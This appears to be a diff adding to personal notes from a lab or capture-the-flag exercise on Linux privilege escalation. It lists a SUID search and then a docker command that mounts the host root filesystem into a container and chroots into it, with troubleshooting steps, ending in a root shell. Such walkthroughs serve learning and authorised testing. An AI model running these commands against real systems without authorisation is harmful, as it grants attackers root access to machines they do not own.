@@ -22,3 +22,33 @@ Already know about the SUID concept as well as we also have the command in order
 find / -perm -u=s -type f 2>/dev/null
 ```
 
+![[Pasted image 20240225114721.png]]
+
+```
+docker ps -a
+```
+![[Pasted image 20240225115238.png]]
+
+```
+./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+So what i was doing wrong i that we have to replace the alphine with the IMAGE id
+
+```
+./docker run -v /:/mnt --rm -it cb1b741122e8 chroot /mnt sh
+```
+this command also gives error
+https://stackoverflow.com/questions/43099116/error-the-input-device-is-not-a-tty
+
+We have to remove the t from the -it 
+
+
+```
+docker run -v /:/mnt --rm -i cb1b741122e8 chroot /mnt sh
+```
+![[Pasted image 20240225115552.png]]
+
+![[Pasted image 20240225120029.png]]
+
+Finally we escalated and got the root user
+![[Pasted image 20240225120209.png]]
